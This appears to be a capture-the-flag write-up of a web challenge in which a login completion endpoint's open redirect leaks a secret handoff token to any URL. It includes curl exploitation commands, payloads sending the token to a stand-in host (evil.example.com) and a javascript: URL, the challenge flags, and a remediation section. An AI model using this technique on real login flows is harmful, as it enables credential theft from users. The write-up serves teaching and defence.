# The Trusted Return Address

- **Platform:** Riffhack CTF (Biterra) — team `ZKaMYBbs`
- **Author:** CL4Y
- **Target:** `http://159.89.230.27/`
- **Category:** Web — Open Redirect + Credential Handoff Leakage
- **Flag:** `bitflag{tru5t3d_r3d1r3cts_c4n_c4rry_s3cr3ts}`

## TL;DR

The marketplace's login flow accepts a `next=` query parameter and, after auth,
forwards the user to `/api/auth/complete?next=<url>`. That endpoint performs an
**open redirect** with no allowlist, and — fatally — appends a `handoff=`
parameter to the outbound `Location` header. The `handoff` value is the flag.

Send any absolute URL as `next` and the server tags the redirect with the
secret:

```
Location: https://evil.example.com/?handoff=bitflag{tru5t3d_r3d1r3cts_c4n_c4rry_s3cr3ts}
```

The challenge hint reads almost like a security advisory in reverse: *"If the
return address is trusted too much, something extra may tag along."*

## Recon

Next.js site styled as a fictional "exploit kit marketplace". Useful surface:

```
$ curl -s http://159.89.230.27/robots.txt
User-Agent: *
Allow: /
Disallow: /operator-cache-drop          # decoy/warm-up flag lives here
```

Probing common auth paths:

```
$ for p in login signin auth dashboard admin api; do
    curl -s -o /dev/null -w "/%-12s %{http_code} -> %{redirect_url}\n" \
      "$p" "http://159.89.230.27/$p"
  done
/login         404
/signin        404
/auth          200
/dashboard     307 -> http://159.89.230.27/auth
/admin         307 -> http://159.89.230.27/admin/login
/api           404
```

So `/auth` is the user login page and `/dashboard` is the post-login
destination. Pulling the client chunk linked from `/auth` reveals the handler:

```
$ curl -s http://159.89.230.27/_next/static/chunks/app/auth/page-*.js
```

De-minified, the submit handler reads:

```js
const res = await fetch(isLogin ? "/api/auth/login" : "/api/auth/register", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ email, password }),
});
const data = await res.json();
if (data.success) {
  const next = new URLSearchParams(window.location.search).get("next");
  setTimeout(() => {
    if (next) {
      window.location.href = "/api/auth/complete?next=" + encodeURIComponent(next);
      return;
    }
    window.location.href = "/dashboard";
  }, 100);
}
```

Two attack-surface signals jump out:

1. The `next` parameter is taken straight from `window.location.search` and
   forwarded to a server-side completion endpoint — server controls the actual
   redirect.
2. The completion endpoint exists *only* for the `next` case, implying it does
   something the plain `/dashboard` redirect does not. (Spoiler: it attaches a
   token to the URL.)

## Exploitation

Register a throwaway account to obtain a session cookie:

```
$ curl -sv -X POST http://159.89.230.27/api/auth/register \
    -H 'Content-Type: application/json' \
    -d '{"email":"ctf@ctf.lab","password":"ctf12345!"}'
...
< set-cookie: auth-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; Path=/; ...
{"success":true,"token":"eyJ...","user":{"id":"s2443s",...}}
```

The token is a standard `HS256` JWT — `{id, email, isVendor:false, iat, exp}` —
which the completion endpoint consumes via cookie.

Now hit the redirect with the cookie, varying `next`:

```
$ TOKEN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
$ for u in /dashboard https://evil.example.com //evil.example.com javascript:alert(1); do
    echo "=== next=$u ==="
    curl -s -o /dev/null -w 'code=%{http_code} loc=%{redirect_url}\n' \
      -b "auth-token=$TOKEN" \
      "http://159.89.230.27/api/auth/complete?next=$(python3 -c \
         'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$u")"
  done

=== next=/dashboard ===
code=500 loc=
=== next=https://evil.example.com ===
code=307 loc=https://evil.example.com/?handoff=bitflag%7Btru5t3d_r3d1r3cts_c4n_c4rry_s3cr3ts%7D
=== next=//evil.example.com ===
code=500 loc=
=== next=javascript:alert(1) ===
code=307 loc=javascript:alert(1)?handoff=bitflag%7Btru5t3d_r3d1r3cts_c4n_c4rry_s3cr3ts%7D
```

URL-decoded:

```
bitflag{tru5t3d_r3d1r3cts_c4n_c4rry_s3cr3ts}
```

That is the flag.

### Observations from the matrix

- **Absolute `http(s)://` URLs are accepted verbatim** — no scheme/host
  allowlist. Classic open redirect.
- **`javascript:` is also accepted** — query-string concatenation runs against
  any URL whose parser succeeds, including dangerous schemes.
- **Same-origin paths (`/dashboard`, `/admin`) raise 500** — the server appears
  to *require* an absolute URL with a host component to enter the
  handoff-tagging branch. The completion endpoint was only ever meant to be
  used for cross-domain hand-off, so it crashes on relative inputs. That detail
  is the giveaway that the bug class is **trust-on-redirect**, not just an open
  redirect.
- **Protocol-relative `//evil.example.com` also 500s** — the URL parser the
  server uses likely needs an explicit scheme, so the bypass surface is
  schemes-only, not host-prefix tricks.

## Root Cause

The completion endpoint conflates *two* separate responsibilities:

1. Redirecting an authenticated user to a destination they requested.
2. Handing off a session/credential ("handoff" token) to that destination via a
   URL parameter, presumably to bootstrap an SSO-style flow.

The "handoff" step assumes the destination is a **trusted relying party**, but
the destination is taken from a user-supplied `next` parameter with no
allowlist. So *any* attacker who can get a victim to click their crafted
`/api/auth/complete?next=https://attacker/...` link receives the victim's
handoff secret in the attacker's HTTP logs.

This is the same bug shape as:

- OAuth `redirect_uri` not validated against the registered client URI.
- SAML `RelayState` accepted as a redirect target without origin checks.
- Generic "post-login `?return=` open redirect" — but with the extra twist that
  the credential rides along, so the impact is *credential theft*, not just
  phishing-style redirection.

## Fix

The minimum repair is a strict allowlist on `next`:

```js
const ALLOWED_HOSTS = new Set(["partner-a.example", "partner-b.example"]);
const u = new URL(next, "http://internal/"); // base lets relative paths parse
if (u.protocol !== "https:" || !ALLOWED_HOSTS.has(u.host)) {
  return res.status(400).json({ error: "untrusted return address" });
}
```

Deeper hardening:

- **Never put a long-lived credential in a query string.** Even with an
  allowlist, query parameters land in browser history, server access logs,
  Referer headers, and shared infrastructure dashboards.
- For SSO-style handoffs, use a **short-lived, single-use nonce** redeemed via
  a back-channel POST from the destination to your token endpoint (OAuth
  authorization-code flow's whole reason for existing).
- Reject `next` values whose scheme is not `http(s)` (kills `javascript:`,
  `data:`, custom schemes).
- Reject `next` values that resolve to a different origin than the configured
  partner set; treat protocol-relative URLs (`//evil`) and userinfo tricks
  (`https://trusted@evil/`) explicitly — `new URL()` parses them, but the
  resulting `.host` is what you must check, not the raw string.

## Tools Used

- `curl` — fetch pages, exercise the redirect endpoint, inspect `Set-Cookie`.
- `python3 urllib.parse` — encode/decode `next=` values.
- A browser's view-source / the bundled Next.js client chunk for the auth
  flow's submit handler.

## Side-Find

`robots.txt` advertises `/operator-cache-drop`, which serves a separate, easy
flag: `bitflag{r0b0ts_4r3_n0t_4_s3cr3t_v4ult}` (covered in
[`crawlers-courtesy.md`](crawlers-courtesy.md), not part of this challenge).

## Time to Solve

~6 minutes — most of it spent reading the minified client chunk to confirm the
`next` parameter was passed server-side rather than acted on purely in the
browser.
